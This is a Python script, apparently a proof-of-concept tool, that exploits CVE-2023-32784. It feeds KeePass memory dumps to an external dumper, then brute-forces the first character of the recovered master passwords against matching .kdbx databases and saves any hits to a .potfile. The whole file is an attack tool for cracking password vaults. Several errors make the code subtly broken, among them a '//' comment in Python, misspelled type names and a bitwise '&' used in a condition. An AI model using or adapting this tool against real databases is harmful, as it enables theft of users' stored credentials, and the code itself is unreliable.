import argparse
import os
from subprocess import run, CalledProcessError
from typing import List
from pykeepass import PyKeePass
from collections.abc import Iterator

charset_first_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:',.<>?`~"

def read_dump_file(dmp_file: str, keepass_dump_dir:str="./keepass-dump-masterkey")-> List[str]:
    """get all possible passwords with the Keepass Dump Masterkey

    Args:
        dmp_file (string): DUMP file path
        keepass_dump_dir (string, optional): path to the keepass dumper. Defaults to "./keepass-dump-masterkey".

    Returns:
        passwords (string:List): an array of possible passwords
    """
    command = ['python3', 'poc.py', dmp_file]
    try:
        passwords = run(command, cwd=keepass_dump_dir, capture_output=True, text=True, check=True).stdout.splitlines()
        return passwords
    except CalledProcessError as e:
        print(f"Error running poc command: {e}")
        return []

def generate_passwords(start_char:str, password_parts: str)-> Interator[str]:
    """generate passwords

    Args:
        start_char (str): char from Charset
        password_parts (str): password

    Yields:
        password (string): generated password
    """
    for password_part in password_parts:
        password = start_char + password_part
        yield password

def try_login(kdbx_file:str, password:str)->boolean:
    """try login with kdbx file and a password

    Args:
        kdbx_file (string): kdbx file
        password (string): password

    Returns:
        True (bool): login is successful
        False (bool): login failed
    """
    try:
        PyKeePass(kdbx_file, password=password)
        print(f"Successfully login with password: {password}\n")
        return True
    except:
        print(f"{password}")
        return False

def main(dir_path:str):
    try:
        kdbx_files = [f for f in os.listdir(dir_path) if f.endswith('.kdbx')]
        dmp_files = [f for f in os.listdir(dir_path) if f.endswith('.DMP')]
        
        if len(kdbx_files) == 0 & len(dmp_files) == 0:
            return
        
        print('********************************************************')
        print(f'DUMP files found:\n{dmp_files},\n')
        print(f'KDBX files found:\n{kdbx_files}')
        print('********************************************************\n')
        
        successfully_passwords = []
        for kdbx_file in kdbx_files:
            corresponding_dmp = kdbx_file.replace('.kdbx', '.DMP')
            if corresponding_dmp in dmp_files:
                dmp_path = f'../dumps/{corresponding_dmp}'
                kdbx_path = os.path.join(dir_path, kdbx_file)

                print('********************************************************')
                print(f'KDBX file: {kdbx_file}\n')
                print(f'DUMP file: {corresponding_dmp}')
                print('********************************************************\n')
                print('Reading DUMP file ...\n')
                
                password_parts = read_dump_file(dmp_path)
                password_found = False
                
                if len(password_parts) > 0:
                    print('********************************************************')
                    print('Read DUMP file successfull!')
                    print('********************************************************\n')
                else:
                    print(f'Keepass Password Dumper program closed.')
                    print('Cannot read DUMP file or there are no passwords')
                    print('********************************************************\n')
                    exit()
                
                print('************************** Try passwords ******************************\n')
                for password in password_parts:
                    if password_found:
                        break 

                    for start_char in charset_first_char:
                        if password_found:
                            break 

                        password_tail = password[20:] // e.g. password = 'possible password Â°kfdh/zj' we only need the password
                        passwords_to_try = generate_passwords(start_char, password_tail)
                        
                        for pw in passwords_to_try:
                            if try_login(kdbx_path, pw):
                                password_found = True
                                successfully_passwords.append(f"{kdbx_file} : {pw}")
                                break
        if len(successfully_passwords) > 0: 
            print('********************************************************')
            print(f'Found passwords:\n{successfully_passwords}')
            print('********************************************************\n')
            potfile = os.path.join(dir_path, '.potfile')
            with open(potfile, 'w', encoding='utf-8') as file:
                for pw_key_pair in successfully_passwords:
                    file.write(f"{pw_key_pair}\n")
                print('Passwords were written to the file .potfile.')
        else:
            print('No correct password pair found.')
    except FileNotFoundError:
        print('Dictionary not found!')
        return
    except KeyboardInterrupt:
        print('\nYou exited the program manually.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit CVE-2023-32784 to crack KeePass master passwords.")
    parser.add_argument("-dir", required=True, help="Directory containing .kdbx and .DMP files")
    args = parser.parse_args()

    print('*************************************************************\n')
    print('KeePass Password Dumping started.\n')
    main(args.dir)
    print('\n*********************** BYE **********************************')
    
